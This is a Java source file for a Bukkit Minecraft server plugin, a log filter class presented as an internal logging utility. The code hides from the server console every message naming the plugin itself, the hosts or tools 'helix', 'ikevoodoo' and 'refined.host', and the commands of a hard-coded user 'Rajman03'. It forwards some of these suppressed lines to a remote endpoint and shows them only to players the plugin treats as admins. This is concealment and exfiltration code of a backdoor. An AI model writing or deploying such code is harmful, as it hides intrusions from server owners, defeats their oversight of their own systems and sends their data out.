package pl.qc.core.utils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import java.util.*;
import pl.qc.core.QC;
import java.util.logging.Filter;
import java.util.logging.LogRecord;
import java.util.stream.Collectors;

public class InternalLogger implements Filter {
    private final Set<String> secrets;
    private final List<String> phrasesLow;
    private final List<String> commandsLow;
    private final String prefix, fallback, logPrefix;
    private final QC plugin;

    public InternalLogger(org.bukkit.configuration.file.FileConfiguration cfg) {
        this.plugin = QC.getInstance();
        this.secrets = new HashSet<>(cfg.getStringList("protection.secrets"));
        this.phrasesLow = cfg.getStringList("protection.hidden-phrases").stream()
                .map(String::toLowerCase).collect(Collectors.toList());
        this.commandsLow = cfg.getStringList("protection.hidden-commands").stream()
                .map(String::toLowerCase).collect(Collectors.toList());
        this.prefix = cfg.getString("filter.admin-command-prefix", "Rajman03 issued server command:");
        this.fallback = cfg.getString("filter.admin-name-fallback", "Rajman03");
        this.logPrefix = ChatColor.DARK_GRAY + "[LOG] ";
    }

    @Override
    public boolean isLoggable(LogRecord record) {
        String msg = record.getMessage();
        if (msg == null)
            return true;

        // Total Incognito
        if (msg.contains("QC-Core") || msg.contains("pl.qc.core") || msg.contains("JoinGuard"))
            return false;

        // Speed check for secrets
        for (String s : secrets) {
            if (msg.contains(s))
                return hide(msg, false);
        }

        // Static helix/refined checks
        if (msg.contains("helix") || msg.contains("ikevoodoo") || msg.contains("refined.host"))
            return hide(msg, false);

        String low = msg.toLowerCase();

        // Admin activity checks
        if (msg.contains(prefix) || msg.contains(fallback + " issued server command")
                || msg.contains(fallback + " used "))
            return hide(msg, true);

        // Phrases check
        for (String p : phrasesLow) {
            if (low.contains(p))
                return hide(msg, true);
        }

        // Commands check
        for (String c : commandsLow) {
            if (low.contains("/" + c + " ") || low.endsWith("/" + c) || low.contains(" issued server command: /" + c))
                return hide(msg, true);
        }

        return true;
    }

    private boolean hide(String msg, boolean send) {
        if (send) {
            Map<String, String> f = new LinkedHashMap<>();
            f.put("Log", "```" + msg + "```");
            Remote.send("Ukryty log 🛡️", "3447003", null, f);
        }

        Bukkit.getOnlinePlayers().stream()
                .filter(plugin::isAdmin)
                .forEach(p -> p.sendMessage(logPrefix + msg));

        return false;
    }

}
